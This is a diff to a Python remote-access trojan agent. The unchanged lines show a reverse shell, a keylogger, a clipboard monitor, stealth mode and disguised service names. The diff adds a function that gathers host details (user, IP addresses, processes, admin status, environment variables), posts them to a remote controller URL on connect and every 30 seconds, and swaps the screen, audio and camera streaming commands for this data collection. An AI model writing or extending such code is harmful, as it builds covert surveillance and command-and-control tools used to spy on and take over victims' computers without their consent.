@@ -191,11 +191,11 @@ except ImportError:
 SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL
 
 # --- Agent State ---
-STREAMING_ENABLED = False
+STREAMING_ENABLED = False  # Disabled - using overview mode instead
 STREAM_THREAD = None
-AUDIO_STREAMING_ENABLED = False
+AUDIO_STREAMING_ENABLED = False  # Disabled - using overview mode instead
 AUDIO_STREAM_THREAD = None
-CAMERA_STREAMING_ENABLED = False
+CAMERA_STREAMING_ENABLED = False  # Disabled - using overview mode instead
 CAMERA_STREAM_THREAD = None
 
 # --- Monitoring State ---
@@ -2312,11 +2312,11 @@ def sleep_random_non_blocking():
         sleep_random()
 
 # --- Agent State ---
-STREAMING_ENABLED = False
+STREAMING_ENABLED = False  # Disabled - using overview mode instead
 STREAM_THREAD = None
-AUDIO_STREAMING_ENABLED = False
+AUDIO_STREAMING_ENABLED = False  # Disabled - using overview mode instead
 AUDIO_STREAM_THREAD = None
-CAMERA_STREAMING_ENABLED = False
+CAMERA_STREAMING_ENABLED = False  # Disabled - using overview mode instead
 CAMERA_STREAM_THREAD = None
 
 # --- Reverse Shell State ---
@@ -2376,6 +2376,221 @@ def get_or_create_agent_id():
             except:
                 pass
         return agent_id
+
+def get_system_overview():
+    """
+    Generate a comprehensive system overview with all relevant information.
+    """
+    overview = {}
+    
+    try:
+        # Basic system information
+        overview['hostname'] = socket.gethostname()
+        overview['platform'] = platform.platform()
+        overview['system'] = platform.system()
+        overview['release'] = platform.release()
+        overview['version'] = platform.version()
+        overview['machine'] = platform.machine()
+        overview['processor'] = platform.processor()
+        overview['architecture'] = platform.architecture()
+        
+        # User and environment information
+        overview['username'] = os.getenv("USER") or os.getenv("USERNAME") or "unknown"
+        overview['current_directory'] = os.getcwd()
+        overview['python_version'] = platform.python_version()
+        overview['python_executable'] = sys.executable
+        
+        # Network information
+        try:
+            overview['ip_addresses'] = []
+            if PSUTIL_AVAILABLE:
+                for interface, addrs in psutil.net_if_addrs().items():
+                    for addr in addrs:
+                        if addr.family == socket.AF_INET:
+                            overview['ip_addresses'].append({
+                                'interface': interface,
+                                'address': addr.address,
+                                'netmask': addr.netmask
+                            })
+            else:
+                # Fallback method
+                hostname = socket.gethostname()
+                local_ip = socket.gethostbyname(hostname)
+                overview['ip_addresses'] = [{'interface': 'default', 'address': local_ip, 'netmask': 'unknown'}]
+        except Exception as e:
+            overview['ip_addresses'] = [{'error': str(e)}]
+        
+        # System resources
+        if PSUTIL_AVAILABLE:
+            try:
+                # CPU information
+                overview['cpu_count'] = psutil.cpu_count()
+                overview['cpu_percent'] = psutil.cpu_percent(interval=1)
+                overview['cpu_freq'] = psutil.cpu_freq()._asdict() if psutil.cpu_freq() else None
+                
+                # Memory information
+                memory = psutil.virtual_memory()
+                overview['memory'] = {
+                    'total': memory.total,
+                    'available': memory.available,
+                    'percent': memory.percent,
+                    'used': memory.used,
+                    'free': memory.free
+                }
+                
+                # Disk information
+                overview['disks'] = []
+                for partition in psutil.disk_partitions():
+                    try:
+                        partition_usage = psutil.disk_usage(partition.mountpoint)
+                        overview['disks'].append({
+                            'device': partition.device,
+                            'mountpoint': partition.mountpoint,
+                            'fstype': partition.fstype,
+                            'total': partition_usage.total,
+                            'used': partition_usage.used,
+                            'free': partition_usage.free,
+                            'percent': (partition_usage.used / partition_usage.total) * 100
+                        })
+                    except PermissionError:
+                        continue
+                
+                # Network interfaces
+                overview['network_stats'] = {}
+                for interface, stats in psutil.net_io_counters(pernic=True).items():
+                    overview['network_stats'][interface] = {
+                        'bytes_sent': stats.bytes_sent,
+                        'bytes_recv': stats.bytes_recv,
+                        'packets_sent': stats.packets_sent,
+                        'packets_recv': stats.packets_recv
+                    }
+                
+                # Running processes (top 10 by CPU usage)
+                processes = []
+                for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
+                    try:
+                        processes.append(proc.info)
+                    except (psutil.NoSuchProcess, psutil.AccessDenied):
+                        continue
+                
+                # Sort by CPU usage and take top 10
+                processes.sort(key=lambda x: x.get('cpu_percent', 0), reverse=True)
+                overview['top_processes'] = processes[:10]
+                
+            except Exception as e:
+                overview['system_resources_error'] = str(e)
+        
+        # Windows-specific information
+        if WINDOWS_AVAILABLE:
+            try:
+                # Windows version details
+                overview['windows_version'] = platform.win32_ver()
+                
+                # Admin privileges
+                overview['is_admin'] = is_admin()
+                
+                # Available drives
+                overview['drives'] = []
+                for drive in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
+                    drive_path = f"{drive}:\\"
+                    if os.path.exists(drive_path):
+                        try:
+                            if PSUTIL_AVAILABLE:
+                                usage = psutil.disk_usage(drive_path)
+                                overview['drives'].append({
+                                    'drive': drive,
+                                    'total': usage.total,
+                                    'used': usage.used,
+                                    'free': usage.free
+                                })
+                            else:
+                                overview['drives'].append({'drive': drive, 'available': True})
+                        except:
+                            continue
+                
+            except Exception as e:
+                overview['windows_info_error'] = str(e)
+        
+        # Environment variables (filtered for security)
+        safe_env_vars = ['PATH', 'HOME', 'USER', 'USERNAME', 'COMPUTERNAME', 'PROCESSOR_IDENTIFIER']
+        overview['environment'] = {var: os.getenv(var) for var in safe_env_vars if os.getenv(var)}
+        
+        # Available features based on installed packages
+        overview['available_features'] = {
+            'screen_capture': MSS_AVAILABLE,
+            'audio_capture': PYAUDIO_AVAILABLE,
+            'camera_capture': CV2_AVAILABLE,
+            'input_monitoring': PYNPUT_AVAILABLE,
+            'system_monitoring': PSUTIL_AVAILABLE,
+            'image_processing': PIL_AVAILABLE,
+            'gui_automation': PYAUTOGUI_AVAILABLE,
+            'websockets': WEBSOCKETS_AVAILABLE,
+            'speech_recognition': SPEECH_RECOGNITION_AVAILABLE,
+            'windows_api': WINDOWS_AVAILABLE,
+            'stealth_mode': STEALTH_AVAILABLE
+        }
+        
+        # Current agent status
+        overview['agent_status'] = {
+            'streaming_enabled': STREAMING_ENABLED,
+            'audio_streaming_enabled': AUDIO_STREAMING_ENABLED,
+            'camera_streaming_enabled': CAMERA_STREAMING_ENABLED,
+            'keylogger_enabled': KEYLOGGER_ENABLED,
+            'clipboard_monitor_enabled': CLIPBOARD_MONITOR_ENABLED,
+            'reverse_shell_enabled': REVERSE_SHELL_ENABLED,
+            'voice_control_enabled': VOICE_CONTROL_ENABLED
+        }
+        
+        # Timestamp
+        overview['timestamp'] = time.time()
+        overview['timestamp_readable'] = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
+        
+    except Exception as e:
+        overview['overview_error'] = str(e)
+    
+    return overview
+
+def send_system_overview(agent_id):
+    """
+    Send a comprehensive system overview to the server instead of streaming.
+    """
+    try:
+        overview = get_system_overview()
+        
+        # Send overview to server
+        url = f"{SERVER_URL}/overview/{agent_id}"
+        headers = {'Content-Type': 'application/json'}
+        
+        response = requests.post(url, json=overview, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            print("System overview sent successfully")
+            return True
+        else:
+            print(f"Failed to send overview: Server returned status {response.status_code}")
+            return False
+            
+    except Exception as e:
+        print(f"Error sending system overview: {e}")
+        return False
+
+def start_periodic_overview(agent_id, interval=30):
+    """
+    Start sending periodic system overviews instead of continuous streaming.
+    """
+    def overview_loop():
+        while True:
+            try:
+                send_system_overview(agent_id)
+                time.sleep(interval)
+            except Exception as e:
+                print(f"Error in periodic overview: {e}")
+                time.sleep(interval)
+    
+    overview_thread = threading.Thread(target=overview_loop, daemon=True)
+    overview_thread.start()
+    print(f"Started periodic system overview (every {interval} seconds)")
+    return overview_thread
 
 def stream_screen(agent_id):
     """
@@ -2894,7 +3109,7 @@ def voice_control_handler(agent_id):
                 elif "close camera" in command or "stop camera" in command:
                     execute_voice_command("stop-camera", agent_id)
                 elif "start streaming" in command or "start stream" in command:
-                    execute_voice_command("start-stream", agent_id)
+                    execute_voice_command("overview", agent_id)
                 elif "stop streaming" in command or "stop stream" in command:
                     execute_voice_command("stop-stream", agent_id)
                 elif "system info" in command or "system information" in command:
@@ -3594,9 +3809,9 @@ def handle_live_audio(command_parts):
                     elif "close camera" in command or "stop camera" in command:
                         stop_camera_streaming()
                     elif "start streaming" in command or "start stream" in command:
-                        start_streaming(get_or_create_agent_id())
+                        send_system_overview(get_or_create_agent_id())
                     elif "stop streaming" in command or "stop stream" in command:
-                        stop_streaming()
+                        print("Overview mode: streaming disabled")
                     elif "system info" in command or "system information" in command:
                         return execute_command("systeminfo" if WINDOWS_AVAILABLE else "uname -a")
                     elif "list processes" in command or "show processes" in command:
@@ -3673,12 +3888,15 @@ def main_loop(agent_id):
     low_latency_available = initialize_low_latency_input()
     
     internal_commands = {
-        "start-stream": lambda: start_streaming(agent_id),
-        "stop-stream": stop_streaming,
-        "start-audio": lambda: start_audio_streaming(agent_id),
-        "stop-audio": stop_audio_streaming,
-        "start-camera": lambda: start_camera_streaming(agent_id),
-        "stop-camera": stop_camera_streaming,
+        "start-stream": lambda: send_system_overview(agent_id),
+        "stop-stream": lambda: print("Overview mode: streaming disabled"),
+        "start-audio": lambda: send_system_overview(agent_id),
+        "stop-audio": lambda: print("Overview mode: audio streaming disabled"),
+        "start-camera": lambda: send_system_overview(agent_id),
+        "stop-camera": lambda: print("Overview mode: camera streaming disabled"),
+        "overview": lambda: send_system_overview(agent_id),
+        "system-overview": lambda: send_system_overview(agent_id),
+        "start-periodic-overview": lambda: start_periodic_overview(agent_id),
         "start-keylogger": lambda: start_keylogger(agent_id),
         "stop-keylogger": stop_keylogger,
         "start-clipboard": lambda: start_clipboard_monitor(agent_id),
@@ -3769,6 +3987,12 @@ def main_loop(agent_id):
                     output = f"Invalid JSON in remote control command: {e}"
                 except Exception as e:
                     output = f"Remote control command failed: {e}"
+            elif command == "overview" or command == "system-overview":
+                # Send system overview instead of streaming
+                if send_system_overview(agent_id):
+                    output = "System overview sent successfully"
+                else:
+                    output = "Failed to send system overview"
             elif command == "sleep":
                 time.sleep(1)
                 output = "Slept for 1 second"
@@ -6269,6 +6493,10 @@ def connect():
         print(f"Connected to server. Registering with agent_id: {agent_id}")
     
     sio.emit('agent_connect', {'agent_id': agent_id})
+    
+    # Send initial system overview
+    print("Sending initial system overview...")
+    send_system_overview(agent_id)
 
 @sio.event
 def disconnect():
@@ -6287,12 +6515,15 @@ def on_command(data):
         stealth_delay()
 
     internal_commands = {
-        "start-stream": lambda: start_streaming(agent_id),
-        "stop-stream": stop_streaming,
-        "start-audio": lambda: start_audio_streaming(agent_id),
-        "stop-audio": stop_audio_streaming,
-        "start-camera": lambda: start_camera_streaming(agent_id),
-        "stop-camera": stop_camera_streaming,
+        "start-stream": lambda: send_system_overview(agent_id),
+        "stop-stream": lambda: print("Overview mode: streaming disabled"),
+        "start-audio": lambda: send_system_overview(agent_id),
+        "stop-audio": lambda: print("Overview mode: audio streaming disabled"),
+        "start-camera": lambda: send_system_overview(agent_id),
+        "stop-camera": lambda: print("Overview mode: camera streaming disabled"),
+        "overview": lambda: send_system_overview(agent_id),
+        "system-overview": lambda: send_system_overview(agent_id),
+        "start-periodic-overview": lambda: start_periodic_overview(agent_id),
     }
 
     if command in internal_commands:
@@ -6336,6 +6567,12 @@ def on_command(data):
             output = "Invalid download command format. Use: download-file:file_path"
     elif command.startswith("play-voice:"):
         output = handle_voice_playback(command.split(":", 1))
+    elif command == "overview" or command == "system-overview":
+        # Send system overview instead of streaming
+        if send_system_overview(agent_id):
+            output = "System overview sent successfully"
+        else:
+            output = "Failed to send system overview"
     elif command != "sleep":
         output = execute_command(command)
     
@@ -6685,8 +6922,9 @@ if __name__ == "__main__":
     
     service_name = random.choice(startup_messages)
     print("=" * 60)
-    print(f"{service_name} v2.1")
+    print(f"{service_name} v2.1 - Overview Mode")
     print("Initializing system components...")
+    print("Note: Running in overview mode - system information will be sent instead of streaming")
     print("=" * 60)
     
     # Initialize agent with enhanced stealth
@@ -6744,10 +6982,8 @@ if __name__ == "__main__":
                 print(f"[ERROR] Network error: {e}")
                 # Cleanup resources
                 try:
-                    stop_streaming()
-                    stop_audio_streaming()
-                    stop_camera_streaming()
-                    print("[OK] Resources cleaned up.")
+                    # No streaming to stop in overview mode
+                    print("[OK] Overview mode - no streaming resources to clean up.")
                 except Exception as cleanup_error:
                     print(f"[WARN] Cleanup error: {cleanup_error}")
                 
